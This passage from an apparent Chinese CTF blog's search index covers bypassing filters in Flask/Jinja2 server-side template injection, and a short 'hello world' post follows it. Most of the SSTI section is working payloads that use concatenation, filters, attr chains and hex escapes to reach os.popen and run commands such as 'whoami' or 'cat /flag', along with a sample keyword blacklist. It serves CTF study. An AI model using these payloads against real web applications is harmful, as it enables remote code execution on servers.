class="line">x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span>  (x为任意值)</span><br></pre></td></tr></table></figure><p><strong>在jinja2里面可以利用~进行拼接</strong> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>%&#125;</span><br><span class="line">&#123;&#123;config[a~b].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> <strong>大小写转换</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&quot;__CLASS__&quot;</span>.lower()].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>利用模板过滤器<strong>format</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>) ].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤器<strong>join</strong>,<strong>lower</strong>还有 <strong>replace reverse</strong> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123;config[<span class="string">&quot;__CLASS__&quot;</span>|lower].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123;config[<span class="string">&quot;__ssalc__&quot;</span>|reverse].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123;config[<span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>)].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p> <strong>string</strong> +  <strong>select</strong> 组合</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__   =&gt; &lt;class &#x27;tuple&#x27;&gt;</span><br><span class="line">(().__class__|string)[0] =&gt; &lt;</span><br><span class="line">()|select|string =&gt; &lt;generator object select_or_reject at 0x0000022717FF33C0&gt;</span><br><span class="line"></span><br><span class="line">(()|select|string)[24] =&gt; _</span><br><span class="line">(()|select|string)[15] =&gt; c</span><br><span class="line">(()|select|string)[20] =&gt; l</span><br><span class="line">(()|select|string)[6] =&gt; a</span><br><span class="line">(()|select|string)[18] =&gt; s</span><br></pre></td></tr></table></figure><h2 id="模板过滤器妙用"><a href="#模板过滤器妙用" class="headerlink" title="模板过滤器妙用"></a>模板过滤器妙用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>下面来自y1ng师傅</p><p> <a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author：颖奇L&#x27;Amore</span></span><br><span class="line"><span class="comment"># 从 globals 里把 eval 函数找出来，然后构造任意字符串放进去 RCE</span></span><br><span class="line">&#123;% <span class="built_in">set</span> xhx = ((&#123; &#125;|select()|string()|<span class="built_in">list</span>()).pop(<span class="number">24</span>)|string())%&#125;  <span class="comment"># _</span></span><br><span class="line">&#123;% <span class="built_in">set</span> spa = ((app.__doc__|<span class="built_in">list</span>()).pop(<span class="number">102</span>)|string())%&#125;  <span class="comment">#空格</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pt = ((app.__doc__|<span class="built_in">list</span>()).pop(<span class="number">320</span>)|string())%&#125;  <span class="comment">#点</span></span><br><span class="line">&#123;% <span class="built_in">set</span> yin = ((app.__doc__|<span class="built_in">list</span>()).pop(<span class="number">337</span>)|string())%&#125;   <span class="comment">#单引号</span></span><br><span class="line">&#123;% <span class="built_in">set</span> left = ((app.__doc__|<span class="built_in">list</span>()).pop(<span class="number">264</span>)|string())%&#125;   <span class="comment">#左括号 （</span></span><br><span class="line">&#123;% <span class="built_in">set</span> right = ((app.__doc__|<span class="built_in">list</span>()).pop(<span class="number">286</span>)|string())%&#125;   <span class="comment">#右括号）</span></span><br><span class="line">&#123;% <span class="built_in">set</span> slas = (y1ng.__init__.__globals__.__repr__()|<span class="built_in">list</span>()).pop(<span class="number">349</span>)%&#125;   <span class="comment">#斜线/</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bu = <span class="built_in">dict</span>(buil=aa,tins=dd)|join() %&#125;  <span class="comment">#builtins</span></span><br><span class="line">&#123;% <span class="built_in">set</span> im = <span class="built_in">dict</span>(imp=aa,ort=dd)|join() %&#125;  <span class="comment">#import</span></span><br><span class="line">&#123;% <span class="built_in">set</span> sy = <span class="built_in">dict</span>(po=aa,pen=dd)|join() %&#125;  <span class="comment">#popen</span></span><br><span class="line">&#123;% <span class="built_in">set</span> os = <span class="built_in">dict</span>(o=aa,s=dd)|join() %&#125;  <span class="comment">#os</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ca = <span class="built_in">dict</span>(ca=aa,t=dd)|join() %&#125;  <span class="comment">#cat</span></span><br><span class="line">&#123;% <span class="built_in">set</span> flg = <span class="built_in">dict</span>(fl=aa,ag=dd)|join() %&#125;  <span class="comment">#flag</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ev = <span class="built_in">dict</span>(ev=aa,al=dd)|join() %&#125; <span class="comment">#eval</span></span><br><span class="line">&#123;% <span class="built_in">set</span> red = <span class="built_in">dict</span>(re=aa,ad=dd)|join()%&#125;  <span class="comment">#read</span></span><br><span class="line">&#123;% <span class="built_in">set</span> bul = xhx*<span class="number">2</span>~bu~xhx*<span class="number">2</span> %&#125;  <span class="comment">#__builtins__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拼接起来 __import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span></span><br><span class="line">&#123;% <span class="built_in">set</span> pld = xhx*<span class="number">2</span>~im~xhx*<span class="number">2</span>~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> y1ng.__init__.__globals__.items() %&#125; <span class="comment">#globals</span></span><br><span class="line">&#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">&#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;  <span class="comment">#builtins</span></span><br><span class="line">&#123;% <span class="keyword">if</span> a == ev %&#125; <span class="comment">#eval</span></span><br><span class="line">&#123;&#123;b(pld)&#125;&#125; <span class="comment">#eval(pld)</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤-和"><a href="#过滤-和" class="headerlink" title="过滤 . _ 和 []"></a>过滤 . _ 和 []</h2><p>利用模板中的过滤器</p><p> <strong>attr</strong> </p><blockquote><p>Get an attribute of an object.<br>foo|attr(“bar”) works like foo.bar<br>just that always an attribute is returned and items are not looked up.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;flag&#x27;</span>).read() &#125;&#125;</span><br><span class="line">=&gt;</span><br><span class="line">&#123;&#123; config|attr(<span class="string">&quot;__class__&quot;</span>).__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;flag&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)</span><br><span class="line">=&gt;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">59</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line">=&gt;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&#x27;</span>)(<span class="number">59</span>)|attr(<span class="string">&#x27;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&#x27;</span>)(<span class="string">&#x27;\x65\x76\x61\x6c&#x27;</span>)(<span class="string">&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x77\x68\x6f\x61\x6d\x69\x22\x29\x2e\x72\x65\x61\x64\x28\x29&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>字符转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;\\x&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2308">https://xz.aliyun.com/t/2308</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p><p><a href="https://lazzzaro.github.io/">https://lazzzaro.github.io/</a></p><p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> python </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="2020/12/30/hello/"/>
      <url>2020/12/30/hello/</url>
      
        <content type="html"><![CDATA[<h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>this is my new blog</p><p>this is my new blog</p><p>this is my new blog</p><p>this is my new blog</p><p>this is my new blog</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;hello,world!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1609421738124.png" alt="1609421738124"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
